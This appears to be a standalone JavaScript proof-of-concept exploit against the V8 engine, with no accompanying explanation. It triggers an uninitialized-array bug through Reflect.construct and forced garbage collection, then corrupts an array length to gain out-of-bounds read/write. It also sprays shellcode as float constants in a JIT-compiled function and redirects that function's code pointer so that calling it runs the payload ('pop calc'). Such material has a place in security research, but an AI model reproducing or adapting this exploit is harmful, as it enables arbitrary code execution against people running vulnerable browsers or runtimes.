class A {}

var x = Array;

class B extends A {
  constructor() {
    x = new.target; 
    super();
  }
}

function construct() {
  var r = Reflect.construct(B, [], Array);
  return r;
}

function scavenge()
{
    for(let i = 0; i < 9; i++)
        new ArrayBuffer(0x200000);
}
function mark_compact()
{
    new ArrayBuffer(0x7f000000);
}
for (let i = 0; i < 2000; i++) {
  construct();
}
function bigintToFloat(bigIntValue) {
    // Create a buffer to hold the 64-bit representation (8 bytes)
    let buffer = new ArrayBuffer(8);
    let view = new DataView(buffer);

    // Set the value in the buffer as a BigInt
    view.setBigUint64(0, bigIntValue);

    // Interpret the buffer as a float
    return view.getFloat64(0);
}

function floatToBigInt(floatValue) {
    // Create a buffer to hold the 64-bit representation (8 bytes)
    let buffer = new ArrayBuffer(8);
    let view = new DataView(buffer);

    // Set the value in the buffer as a float
    view.setFloat64(0, floatValue);

    // Interpret the buffer as a BigInt
    return view.getBigUint64(0);
}

function foo()
{
    return [1.9711828996832522e-246, 1.9711828988871364e-246, 1.9711828997389256e-246, 1.9711822978046528e-246, 1.971182386470143e-246, 1.9711823521545355e-246, 1.9711828967753593e-246, 1.9711828966588095e-246, 1.971182488784266e-246, 1.9711829001551753e-246, 1.971182900221776e-246, 1.930807268841044e-246, 1.971182899833102e-246, 1.9711336418715412e-246, 1.9711828988902342e-246, 1.971182900238425e-246, 1.9711828999829518e-246, 1.9711828997299502e-246, 1.9711828988954815e-246, 1.9711828988902502e-246];
}
for(let i = 0; i < 0x40000; i++) foo();

scavenge();
mark_compact();
let corruptedArr = construct(); 

console.log("Uninitialized length: 0x" + corruptedArr.length.toString(16));
let doubleArr1 = [1.5, 2.2, 3.3];
let doubleArr2 = [1.5, 2.2, 3.3];
let baseEle = 0x218;
let arr1Addr = 0x421d8;
let arr2Addr = 0x42230;

//change the length of double arr2 to 0x10000
let index = (arr1Addr + 0xc - (baseEle + 0x8)) / 4;
corruptedArr[index] = 0x10000 << 1;

//%DebugPrint(corruptedArr);
//%DebugPrint(doubleArr1);
//%DebugPrint(doubleArr2);
//%DebugPrint(foo);

let startAddr = 0x19ad00;
let funcAddr = 0x0n;
let nameFunc = 0x19a499;
let target = (BigInt(0x10000 << 1) << 32n) + BigInt(startAddr + 1); //index 8
doubleArr1[8] = bigintToFloat(target); //write to element of doubleArr2
let funcIndex = 0;
while(true)
{
    let var0 = floatToBigInt(doubleArr2[funcIndex]) & 0xffffffffn
    let var1 = floatToBigInt(doubleArr2[funcIndex]) >> 32n;
    if(var0 == BigInt(nameFunc))
    {
        //console.log(BigInt(startAddr) + BigInt(funcIndex + 1)*8n);
        funcAddr = BigInt(startAddr) + BigInt(funcIndex + 1)*8n - 0x24n;
        break;
    }
    else if(var1 == BigInt(nameFunc))
    {
        //console.log(BigInt(startAddr) + BigInt(funcIndex + 1)*8n + 4n);
        funcAddr = BigInt(startAddr) + BigInt(funcIndex + 1)*8n - 0x20n;
        break;
    }
    else
        funcIndex++;
}
target = (BigInt(0x10000 << 1) << 32n) + funcAddr + 1n; //index 8
doubleArr1[8] = bigintToFloat(target); //write to element of doubleArr2
console.log('Func addr: 0x' + funcAddr.toString(16));
let tmp = doubleArr2[2];
let code = floatToBigInt(tmp) & 0xffffffffn;
console.log("Code: 0x" + code.toString(16));
//index = (arr2Addr + 0x8 - )
target = (BigInt(0x10000 << 1) << 32n) + code; //index 8
doubleArr1[8] = bigintToFloat(target); //write to element of doubleArr2
let jitCode = floatToBigInt(doubleArr2[1]);
console.log('Code start: 0x' + jitCode.toString(16));
let newJit = jitCode + 0x5cn; //modify jitcode
console.log("New code: 0x" + newJit.toString(16));
doubleArr2[1] = bigintToFloat(newJit);
foo() //pop calc
